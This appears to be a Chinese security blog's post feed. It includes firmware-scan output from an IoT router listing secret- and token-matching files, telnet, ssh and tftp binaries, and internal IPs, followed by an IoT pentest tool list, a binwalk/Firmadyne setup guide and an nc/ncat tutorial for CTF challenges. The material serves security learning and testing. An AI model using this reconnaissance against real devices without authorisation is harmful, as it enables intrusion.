——————–<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;default&#x2F;rcS<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnet</p><p>——————– secret ——————–<br>t&#x2F;bin&#x2F;dhcp6s<br>t&#x2F;bin&#x2F;dhcp6c</p><p>——————– pgp ——————–<br>t&#x2F;lib&#x2F;libresolv.so.2</p><p>——————– gpg ——————–<br>t&#x2F;disk&#x2F;internal-storage.iso</p><p>——————– token ——————–<br>t&#x2F;sbin&#x2F;iwconfig<br>t&#x2F;sbin&#x2F;adbd<br>t&#x2F;sbin&#x2F;tc<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;radvd<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;lib&#x2F;libjansson.so<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;ld-linux.so.3<br>t&#x2F;lib&#x2F;libsqlite3.so.0<br>t&#x2F;lib&#x2F;libmount.so.1<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libblkid.so.1<br>t&#x2F;lib&#x2F;libpcap.so.1<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Firewall.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_WLAN.html</p><p>——————– api key ——————–</p><p>——————– oauth ——————–</p><p><em><strong>Search for web servers</strong></em><br>##################################### search for web servers<br>##################################### apache</p><p>##################################### lighttpd</p><p>##################################### alphapd</p><p>##################################### httpd<br>t&#x2F;sbin&#x2F;httpd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;httpd</p><p><em><strong>Search for important binaries</strong></em><br>##################################### important binaries<br>##################################### ssh<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;ssh</p><p>##################################### sshd</p><p>##################################### scp<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;scp</p><p>##################################### sftp</p><p>##################################### tftp<br>t&#x2F;bin&#x2F;tftp<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;tftp</p><p>##################################### dropbear<br>t&#x2F;etc&#x2F;dropbear<br>t&#x2F;etc&#x2F;init.d&#x2F;dropbear</p><p>##################################### busybox<br>t&#x2F;bin&#x2F;busybox</p><p>##################################### telnet<br>t&#x2F;bin&#x2F;telnet<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnet</p><p>##################################### telnetd<br>t&#x2F;sbin&#x2F;telnetd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnetd</p><p>##################################### openssl</p><p><em><strong>Search for ip addresses</strong></em><br>##################################### ip addresses<br>0.0.0.0<br>127.0.0.1<br>1.4.12.1<br>169.254.0.0<br>169.254.255.255<br>192.168.0.0<br>192.168.0.1<br>192.168.0.20<br>192.168.0.40<br>192.168.1.0<br>192.168.10.1<br>192.168.10.109<br>192.168.1.1<br>192.168.1.20<br>192.168.1.40<br>192.168.1.8<br>192.168.2.1<br>192.168.2.20<br>192.168.2.40<br>192.168.50.1<br>192.168.50.2<br>192.168.7.0<br>192.168.7.1<br>192.168.7.113<br>192.168.7.2<br>224.0.0.0<br>255.255.0.0<br>255.255.255.0<br>255.255.255.255<br>4.1.4.2<br>4.1.4.3<br>88.22.44.13</p><p><em><strong>Search for urls</strong></em><br>##################################### urls<br><a href="http://0pointer.de/">http://0pointer.de</a><br><a href="http://avahi.org/">http://avahi.org</a><br><a href="http://codeaurora.org/">http://codeaurora.org</a><br><a href="http://code.google.com/">http://code.google.com</a><br><a href="http://dbus.freedesktop.org/">http://dbus.freedesktop.org</a><br><a href="http://developer.android.com/">http://developer.android.com</a><br><a href="http://download.savannah.gnu.org/">http://download.savannah.gnu.org</a><br><a href="http://downloads.sourceforge.net/">http://downloads.sourceforge.net</a><br><a href="http://ebtables.sourceforge.net/">http://ebtables.sourceforge.net</a><br><a href="http://expat.sourceforge.net/">http://expat.sourceforge.net</a><br><a href="http://ftp.gnome.org/">http://ftp.gnome.org</a><br><a href="http://kernel.org/">http://kernel.org</a><br><a href="http://linuxwireless.org/">http://linuxwireless.org</a><br><a href="http://matt.ucc.asn.au/">http://matt.ucc.asn.au</a><br><a href="http://miniupnp.free.fr/">http://miniupnp.free.fr</a><br><a href="http://netfilter.org/">http://netfilter.org</a><br><a href="http://packages.debian.org/">http://packages.debian.org</a><br><a href="http://pkg-shadow.alioth.debian.org/">http://pkg-shadow.alioth.debian.org</a><br><a href="http://savannah.nongnu.org/">http://savannah.nongnu.org</a><br><a href="http://sites.google.com/">http://sites.google.com</a><br><a href="http://sourceforge.net/">http://sourceforge.net</a><br><a href="http://support.cdmatech.com/">http://support.cdmatech.com</a><br><a href="http://theory.uwinnipeg.ca/">http://theory.uwinnipeg.ca</a><br><a href="http://tinylogin.busybox.net/">http://tinylogin.busybox.net</a><br><a href="http://wireless.kernel.org/">http://wireless.kernel.org</a><br><a href="http://www.angstrom-distribution.org/">http://www.angstrom-distribution.org</a><br><a href="http://www.busybox.net/">http://www.busybox.net</a><br><a href="http://www.eglibc.org/">http://www.eglibc.org</a><br><a href="http://www.freebsd.org/">http://www.freebsd.org</a><br><a href="http://www.freedesktop.org/">http://www.freedesktop.org</a><br><a href="http://www.gnu.org/">http://www.gnu.org</a><br><a href="http://www.hpl.hp.com/">http://www.hpl.hp.com</a><br><a href="http://www.iana.org/">http://www.iana.org</a><br><a href="http://www.info-zip.org/">http://www.info-zip.org</a><br><a href="http://www.infradead.org/">http://www.infradead.org</a><br><a href="http://www.linuxfoundation.org/">http://www.linuxfoundation.org</a><br><a href="http://www.linux-mtd.infradead.org/">http://www.linux-mtd.infradead.org</a><br><a href="http://www.mylan/">http://www.mylan</a><br><a href="http://www.netfilter.org/">http://www.netfilter.org</a><br><a href="http://www.openssl.org/">http://www.openssl.org</a><br><a href="http://www.quantatw.com/">http://www.quantatw.com</a><br><a href="http://www.tcpdump.org/">http://www.tcpdump.org</a><br><a href="http://www.w3.org/">http://www.w3.org</a><br><a href="http://www.xmlsoft.org/">http://www.xmlsoft.org</a><br><a href="http://www.zlib.net/">http://www.zlib.net</a><br><a href="http://zlib.net/">http://zlib.net</a></p><p><em><strong>Search for emails</strong></em><br>##################################### emails<br><a href="mailto:&#97;&#106;&#x74;&#x40;&#x64;&#101;&#98;&#105;&#x61;&#x6e;&#46;&#x6f;&#114;&#103;">&#97;&#106;&#x74;&#x40;&#x64;&#101;&#98;&#105;&#x61;&#x6e;&#46;&#x6f;&#114;&#103;</a><br><a href="mailto:&#98;&#100;&#115;&#99;&#x68;&#117;&#x79;&#x6d;&#x40;&#112;&#x61;&#110;&#x64;&#111;&#x72;&#97;&#46;&#x62;&#101;">&#98;&#100;&#115;&#99;&#x68;&#117;&#x79;&#x6d;&#x40;&#112;&#x61;&#110;&#x64;&#111;&#x72;&#97;&#46;&#x62;&#101;</a><br><a href="mailto:&#66;&#114;&#x75;&#99;&#101;&#x40;&#80;&#x69;&#120;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;">&#66;&#114;&#x75;&#99;&#101;&#x40;&#80;&#x69;&#120;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;</a><br><a href="mailto:&#x62;&#114;&#117;&#x6e;&#x6f;&#x2e;&#114;&#x61;&#110;&#x64;&#x6f;&#x6c;&#102;&#64;&#x34;&#103;&#x2d;&#115;&#x79;&#x73;&#116;&#101;&#x6d;&#x73;&#x2e;&#98;&#105;&#122;">&#x62;&#114;&#117;&#x6e;&#x6f;&#x2e;&#114;&#x61;&#110;&#x64;&#x6f;&#x6c;&#102;&#64;&#x34;&#103;&#x2d;&#115;&#x79;&#x73;&#116;&#101;&#x6d;&#x73;&#x2e;&#98;&#105;&#122;</a><br><a href="mailto:&#100;&#x61;&#103;&#x40;&#x77;&#x69;&#101;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;">&#100;&#x61;&#103;&#x40;&#x77;&#x69;&#101;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;</a><br><a href="mailto:&#100;&#101;&#x66;&#x61;&#117;&#108;&#x74;&#x40;&#x6e;&#111;&#x2d;&#x69;&#112;&#x2e;&#x63;&#x6f;&#x6d;">&#100;&#101;&#x66;&#x61;&#117;&#108;&#x74;&#x40;&#x6e;&#111;&#x2d;&#x69;&#112;&#x2e;&#x63;&#x6f;&#x6d;</a><br><a href="mailto:&#109;&#x69;&#113;&#x75;&#101;&#108;&#115;&#64;&#99;&#105;&#115;&#116;&#x72;&#111;&#x6e;&#x2e;&#x6e;&#x6c;">&#109;&#x69;&#113;&#x75;&#101;&#108;&#115;&#64;&#99;&#105;&#115;&#116;&#x72;&#111;&#x6e;&#x2e;&#x6e;&#x6c;</a><br><a href="mailto:&#111;&#112;&#101;&#x6e;&#101;&#109;&#x62;&#x65;&#100;&#100;&#101;&#x64;&#x2d;&#99;&#x6f;&#x72;&#x65;&#64;&#108;&#105;&#115;&#116;&#115;&#46;&#x6f;&#112;&#101;&#x6e;&#x65;&#109;&#98;&#101;&#x64;&#100;&#101;&#x64;&#x2e;&#111;&#114;&#103;">&#111;&#112;&#101;&#x6e;&#101;&#109;&#x62;&#x65;&#100;&#100;&#101;&#x64;&#x2d;&#99;&#x6f;&#x72;&#x65;&#64;&#108;&#105;&#115;&#116;&#115;&#46;&#x6f;&#112;&#101;&#x6e;&#x65;&#109;&#98;&#101;&#x64;&#100;&#101;&#x64;&#x2e;&#111;&#114;&#103;</a><br><a href="mailto:&#x72;&#111;&#107;&#x2e;&#112;&#x61;&#x70;&#x65;&#122;&#64;&#97;&#x72;&#x6e;&#x65;&#115;&#x2e;&#115;&#x69;">&#x72;&#111;&#107;&#x2e;&#112;&#x61;&#x70;&#x65;&#122;&#64;&#97;&#x72;&#x6e;&#x65;&#115;&#x2e;&#115;&#x69;</a><br><a href="mailto:&#x72;&#112;&#x75;&#x72;&#100;&#105;&#x65;&#x40;&#111;&#x70;&#x65;&#x6e;&#101;&#100;&#x68;&#97;&#110;&#x64;&#x2e;&#99;&#x6f;&#x6d;">&#x72;&#112;&#x75;&#x72;&#100;&#105;&#x65;&#x40;&#111;&#x70;&#x65;&#x6e;&#101;&#100;&#x68;&#97;&#110;&#x64;&#x2e;&#99;&#x6f;&#x6d;</a><br><a href="mailto:&#115;&#x61;&#110;&#100;&#x6d;&#97;&#x6e;&#x40;&#104;&#97;&#110;&#100;&#104;&#x65;&#x6c;&#100;&#x73;&#x2e;&#111;&#114;&#x67;">&#115;&#x61;&#110;&#100;&#x6d;&#97;&#x6e;&#x40;&#104;&#97;&#110;&#100;&#104;&#x65;&#x6c;&#100;&#x73;&#x2e;&#111;&#114;&#x67;</a><br><a href="mailto:&#x73;&#x65;&#x62;&#x61;&#115;&#116;&#105;&#x65;&#x6e;&#x2e;&#101;&#115;&#x74;&#x69;&#101;&#x6e;&#110;&#x65;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#x73;&#x65;&#x62;&#x61;&#115;&#116;&#105;&#x65;&#x6e;&#x2e;&#101;&#115;&#x74;&#x69;&#101;&#x6e;&#110;&#x65;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a><br><a href="mailto:&#x73;&#114;&#98;&#64;&#99;&#x75;&#x63;&#105;&#x2e;&#x6e;&#x6c;">&#x73;&#114;&#98;&#64;&#99;&#x75;&#x63;&#105;&#x2e;&#x6e;&#x6c;</a><br><a href="mailto:&#x54;&#105;&#109;&#x40;&#82;&#x69;&#107;&#x65;&#114;&#x73;&#46;&#x6f;&#114;&#103;">&#x54;&#105;&#109;&#x40;&#82;&#x69;&#107;&#x65;&#114;&#x73;&#46;&#x6f;&#114;&#103;</a><br><a href="mailto:&#x77;&#97;&#x6c;&#x74;&#101;&#114;&#x73;&#x40;&#100;&#101;&#x62;&#105;&#97;&#110;&#46;&#x6f;&#114;&#103;">&#x77;&#97;&#x6c;&#x74;&#101;&#114;&#x73;&#x40;&#100;&#101;&#x62;&#105;&#97;&#110;&#46;&#x6f;&#114;&#103;</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT】物联网渗透测试-工具要求</title>
    <link href="/2022/09/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82/"/>
    <url>/2022/09/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82/</url>
    
    <content type="html"><![CDATA[<h2 id="固件分析工具"><a href="#固件分析工具" class="headerlink" title="固件分析工具"></a>固件分析工具</h2><ul><li><p>Binwalk</p></li><li><p>Firmadyne</p></li><li><p>Firmwalker</p></li><li><p>Angr</p></li><li><p>firmware-mod-toolkit</p></li><li><p>Firmware Analysis Toolkit</p></li><li><p>GDB</p></li><li><p>Radare2</p></li><li><p>Binary Analysis Tool（BAT）</p></li><li><p>Qemu</p></li><li><p>IDA Pro（可选）</p></li></ul><h2 id="Web应用渗透测试工具"><a href="#Web应用渗透测试工具" class="headerlink" title="Web应用渗透测试工具"></a>Web应用渗透测试工具</h2><blockquote><p>Web应用渗透测试的常见工具主要包括Burp Suite和OWASP ZAP。Burp Suite有免费版和专业版之分，专业版的价格也不算离谱。而ZAP则是完全免费并且开源的，在需要控制成本的情况下，ZAP不失为一种比较好的选择。在对Web服务和API进行测试时，还可以加载插件。但是，如果要安装Burp Suite的插件，则需要先购买专业版。这里列出的所有工具都是跨平台的，它们要么是基于Java开发的，要么可以内置在浏览器中</p></blockquote><ul><li><p>Burp Suite</p></li><li><p>OWASP Zed Attack Proxy（ZAP）</p></li><li><p>REST Easy Firefox Plugin</p></li><li><p>Postman Chrome Extension</p></li></ul><h2 id="移动应用渗透测试工具"><a href="#移动应用渗透测试工具" class="headerlink" title="移动应用渗透测试工具"></a>移动应用渗透测试工具</h2><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ul><li>发行版Android渗透测试虚拟机：Android SDK、Android </li><li>Emulator</li><li>Enjarify</li><li>JD-Gui</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ul><h3 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h3><blockquote><p>由于iOS平台比较特殊，因此在开始渗透测试前需要准备好OS X计算机和已越狱的苹果设备。如果不满足这两个前提条件，那么是无法对iOS应用开展渗透测试的。下面是对iOS应用进行渗透测试时用到的部分工具。</p></blockquote><p>下面列出的是需要在OS X计算机上安装的iOS应用渗透测试工具和安全评估工具：</p><ul><li>idb</li><li>Xcode Tools</li><li>Class-Dump</li><li>Hopper（可选）</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ul><p>下面列出的是为开展渗透测试需要安装在越狱设备上的软件：</p><ul><li>Cydia</li><li>openURL</li><li>dumpdecrypted</li><li>ipainstaller</li><li>SSL Kill Switch 2</li><li>Clutch2</li><li>Cycript</li></ul><h2 id="无线电分析工具需求"><a href="#无线电分析工具需求" class="headerlink" title="无线电分析工具需求"></a>无线电分析工具需求</h2><h3 id="无线电分析硬件"><a href="#无线电分析硬件" class="headerlink" title="无线电分析硬件"></a>无线电分析硬件</h3><p>下面列出了用于分析无线电频谱的硬件设备：</p><ul><li>Atmel RZ Raven USB设备（KillerBee攻击框架）</li><li>Attify Badge[1]（或者C232HM-DDHSL-0线缆同Adafruit FTDI Breakout开发板的搭配）</li><li>HackRF One</li><li>Yardstick One</li><li>带有Xbee Shield模块的XBee扩展板</li><li>Ubertooth</li><li>BLe适配器</li></ul><h3 id="无线电分析软件"><a href="#无线电分析软件" class="headerlink" title="无线电分析软件"></a>无线电分析软件</h3><ul><li>KillerBee框架</li><li>Attify ZigBee框架</li><li>GNU Radio</li><li>BLEAH</li><li>GQRX</li><li>Ubertooth tools</li><li>Blue Hydra</li><li>RTL-sdr</li><li>Hackrf packages</li><li>EZ-Wave</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT PWN】 环境搭建</title>
    <link href="/2022/09/13/%5BIOT%20PWN%5D%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/09/13/%5BIOT%20PWN%5D%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="硬件资源"><a href="#硬件资源" class="headerlink" title="硬件资源"></a>硬件资源</h2><p>太多辣，以后看需求慢慢购入吧</p><ul><li>万用表，主要的功能是用来测试UART(TLL)中的几个接口，比如<code>RX</code>、<code>TX</code>、<code>GND</code>。</li><li>CH340G设备(USB转TTL)，这个设备主要的将电脑与IoT设备用TTL线连接，方便进入IoT设备的终端(Shell)。</li><li>电烙铁，这里买电烙铁的主要用途是焊接UART接口的针脚。</li><li>焊锡丝</li><li>针脚，针脚主要用来焊接UART接口</li><li>编辑器，编程器主要是用来帮助我们dump IoT设备上例如<code>闪存芯片</code>里面的数据，一般都为固件包。编程器的话一般买CH341A够用了，基本上8脚的芯片都支持。如果富裕的话编程器可以买个爱修的RT80H编程器，或者RT809F也不错。</li><li>热风枪，这个其实可有可无，相对于技术比较高的人用，因为热风枪主要是吹出芯片然后放到编程器上面用来dump估计，但是一般来说用夹子就可以把固件dump出来。</li><li>测试夹、探针，这个的主要用途是省的我们去焊接UART接口的针脚了，直接用这夹子加上去用CH340G设备连接即可，不过UART接口要规则才行，要一排的那种。</li><li>免拆芯片通用测试夹，这设备主要也是帮助用来dump芯片固件的，我们买的编程器夹子一般只能用来夹8脚，当超过8脚就不好用了，所以可以用这种通用测试夹来夹住芯片然后dump估计。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><p>binwalk是一个固件解包的工具，当我们用编程器dump出一个固件用，需要用binwalk来解压。一般做misc也会经常用到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install binwalk<br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-envir/image-20220913113915723.png" alt="image-20220913113915723"></p><p>固件解包命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -Me file.bin<br></code></pre></td></tr></table></figure><p>家里旧路由器解包出来的文件，太多了没截全</p><p><img src="/img/article/iot-envir/image-20220913114057712.png" alt="家里旧路由器的固件"></p><h3 id="Firmadyne（固件仿真）"><a href="#Firmadyne（固件仿真）" class="headerlink" title="Firmadyne（固件仿真）"></a>Firmadyne（固件仿真）</h3><p>这工具主要是用来仿真，将固件用qemu模拟启动起来，不过不是百分百模拟成功的，经常会仿失败，常见就是环境等问题。(建议还是买真机好)</p><blockquote><p>安装可参考github上的文章：<a href="https://github.com/firmadyne/firmadyne#introduction">https://github.com/firmadyne/firmadyne#introduction</a></p></blockquote><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan<br>git <span class="hljs-built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git<br></code></pre></td></tr></table></figure><h4 id="重新构建binwalk"><a href="#重新构建binwalk" class="headerlink" title="重新构建binwalk"></a>重新构建binwalk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git<br><span class="hljs-built_in">cd</span> binwalk<br>sudo ./deps.sh<br>sudo python3 ./setup.py install<br></code></pre></td></tr></table></figure><h4 id="数据库安装"><a href="#数据库安装" class="headerlink" title="数据库安装"></a>数据库安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install postgresql<br>sudo -u postgres createuser -P firmadyne，带密码firmadyne<br>sudo -u postgres createdb -O firmadyne firmware<br>sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema<br></code></pre></td></tr></table></figure><h4 id="设置Firmadyne"><a href="#设置Firmadyne" class="headerlink" title="设置Firmadyne"></a>设置Firmadyne</h4><p>替换config文件中的绝对文件路径</p><p><img src="/img/article/iot-envir/image-20220913122554653.png" alt="image-20220913122554653"></p><p>构建二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ./firmadyne; ./download.sh<br></code></pre></td></tr></table></figure><p>安装所需的其他<code>qemu</code>相关依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils<br></code></pre></td></tr></table></figure><h2 id="仿真Netgear-网络路由器-WNAP320测试"><a href="#仿真Netgear-网络路由器-WNAP320测试" class="headerlink" title="仿真Netgear(网络路由器) WNAP320测试"></a>仿真Netgear(网络路由器) WNAP320测试</h2><h4 id="固件包下载"><a href="#固件包下载" class="headerlink" title="固件包下载"></a>固件包下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip<br><br><span class="hljs-built_in">mv</span> WNAP320\ Firmware\ Version\ 2.0.3.zip WNAP320.zip  <br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-envir/image-20220913133114466.png" alt="image-20220913133114466"></p><h4 id="解压固件包"><a href="#解压固件包" class="headerlink" title="解压固件包"></a>解压固件包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo python3 ./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk <span class="hljs-string">&quot;WNAP320.zip&quot;</span> images<br><br><span class="hljs-comment">#参数解释</span><br>-b   <span class="hljs-string">&quot;brand 品牌&quot;</span><br>-sql <span class="hljs-string">&quot;连接本地数据库&quot;</span><br>-np  <span class="hljs-string">&quot;代表没有并行操作&quot;</span><br>-nk  <span class="hljs-string">&quot;代表不提取内核&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>如出现No module named ‘magic’错误，可以尝试使用pip3 install python-magic解决</p></blockquote><p><img src="/img/article/iot-envir/image-20220913133817467.png" alt="image-20220913133817467"></p><h4 id="识别CPU框架"><a href="#识别CPU框架" class="headerlink" title="识别CPU框架"></a>识别CPU框架</h4><p>接着是执行<code>./script/getArch.sh</code>脚本来获取路由器固件的CPU架构。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./scripts/getArch.sh ./images/1.tar.gz<br></code></pre></td></tr></table></figure><p>焯，这里卡住了. 但是找到了一个issue: <a href="https://github.com/attify/firmware-analysis-toolkit/issues/27">.&#x2F;images&#x2F;1.tar.gz: Cannot open: No such file or directory · Issue #27 · attify&#x2F;firmware-analysis-toolkit (github.com)</a></p><p>暂时不知道怎么解决</p><p><img src="/img/article/iot-envir/image-20220913143102694.png" alt="image-20220913143102694"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nc/ncat 使用教学</title>
    <link href="/2022/09/13/nc%20%E6%98%AF%E4%BB%80%E4%B9%88/"/>
    <url>/2022/09/13/nc%20%E6%98%AF%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文用于介绍信息安全大赛中不少题目需要使用的 nc&#x2F;ncat 工具。<br>如果有什么建议，可以在页面底部登录Github使用评论功能，我看不到账号密码的，不用担心🤩</p></blockquote><h2 id="nc-是什么"><a href="#nc-是什么" class="headerlink" title="nc 是什么"></a>nc 是什么</h2><p><code>nc/ncat</code> 是 netcat 的缩写，它可以读写 TCP 与 UDP 端口——或许你看不懂这句话，这没有关系。简单地说，它可以在字符界面下，让你和服务器沟通交流。</p><p>一般来说，有很多题目都会要求你使用 <code>nc</code> 连接到他们的服务器，并且进行交互，获得 flag。</p><h2 id="如何安装-nc"><a href="#如何安装-nc" class="headerlink" title="如何安装 nc"></a>如何安装 nc</h2><p><code>nc</code> 命令在 macOS 中是自带的，在 Linux 中一般自带，或是可以使用相应的软件包管理器安装（如在 Debian&#x2F;Ubuntu 中这个包名叫 netcat）。</p><p>当然，如果你在看这篇手册，你的操作系统很有可能是 Windows。它不自带 <code>nc</code>，尽管可以用 WSL 或者虚拟机的方式解决，但是如果你觉得这样太麻烦了，也有另外一些方法。</p><h3 id="使用静态链接的-ncat-程序"><a href="#使用静态链接的-ncat-程序" class="headerlink" title="使用静态链接的 ncat 程序"></a>使用静态链接的 ncat 程序</h3><p>前往 <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe</a> 下载此程序。我们也在这里提供了一份。下载下来即可。</p><p><a href="https://planet.ustclug.org/wp-content/uploads/2019/09/ncat.zip">ncat.zip 下载</a></p><p><em>注：<code>nc</code>&#x2F;<code>ncat</code> 事实上是两个不同的程序，但在我们接下来的使用上，基本没有区别。<code>ncat</code> 是由 Nmap 项目开发的“重置版的 Netcat”。</em></p><h4 id="我的杀毒软件报毒！"><a href="#我的杀毒软件报毒！" class="headerlink" title="我的杀毒软件报毒！"></a>我的杀毒软件报毒！</h4><p>这是 virustotal 的检测结果：<a href="https://www.virustotal.com/gui/file/d0baada87420dd7c2e63d0dd3248749c06b53806d3021863c4fa659608053a8a/detection">https://www.virustotal.com/gui/file/d0baada87420dd7c2e63d0dd3248749c06b53806d3021863c4fa659608053a8a/detection</a></p><p>如果你不相信此来源，也可以下载 <code>nmap</code>（一个网络探测、扫描工具），它会附带一个 <code>ncat</code>。</p><h2 id="如何使用-nc"><a href="#如何使用-nc" class="headerlink" title="如何使用 nc?"></a>如何使用 nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>直接双击解压出来的<code>ncat.exe</code>，你会看到一个窗口一扫而过——这是正常现象。你需要使用「命令提示符」或者「PowerShell」来访问这个程序。</p><p>Windows 10 中，你可以使用资源管理器 -&gt; 文件来在你存放 <code>nc</code> 的目录中打开命令提示符或 PowerShell。</p><p><img src="/img/article/nc/explorer-1024x510-1663035408603-1.png" alt="在 Windows 资源管理器中打开命令提示符或 PowerShell"></p><p>或者，在Windows 11中，你也可以在开始菜单中搜索PowerShell，然后使用 <code>cd</code> 命令转移到<code>ncat.exe</code>对应的目录：输入 <code>cd 文件夹名</code> 可以让你转移到对应的文件夹，输入 <code>cd ..</code> 可以让你转移到上面一层目录。使用 <code>dir</code> 命令，可以显示当前目录下所有文件。同时，使用 Tab 键可以帮助你补全名称。操作如下</p><ul><li>首先在开始菜单中搜索Windows PowerShell并打开，在Windows 11和Windows 10中PowerShell的背景颜色不同，会存在蓝色和黑色两种背景，不用特别在意</li></ul><p><img src="/img/article/nc/image-20220913095851978.png" alt="在开始菜单中搜索PowerShell"></p><ul><li>复制解压出来的<code>ncat.exe</code>文件的地址，我这里是<code>E:\迅雷下载\ncat</code></li></ul><p><img src="/img/article/nc/image-20220913100512883.png" alt="复制文件地址"></p><ul><li>然后在PowerShell中输入<code>cd 你的文件地址</code>，例如<code>cd E:\迅雷下载\ncat</code>，便可进入对应文件夹地址，cmd操作相同</li></ul><p><img src="/img/article/nc/image-20220913100455215.png" alt="进入文件地址"></p><p>当跳转到你存放 <code>nc</code> 的文件夹后：</p><ul><li>如果你使用的是 PowerShell，输入 <code>./ncat</code>（根据 <code>nc</code> 对应的名称不同而不同）。</li><li>如果你使用的是命令提示符cmd，输入 <code>ncat</code>（根据 <code>nc</code> 对应的名称不同而不同）。</li></ul><p>当显示以下内容时，说明你成功运行了它。<img src="/img/article/nc/image-20220913100732337.png" alt="成功运行 ncat"></p><p><img src="/img/article/nc/cmdncat-1024x596-1663035419107-3.png" alt="成功运行 ncat"></p><p>成功运行之后我们便可以通过下面这样的指令来运行程序服务并打开题目了</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#PowerShell中使用</span><br>./ncat <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;port&gt;</span> 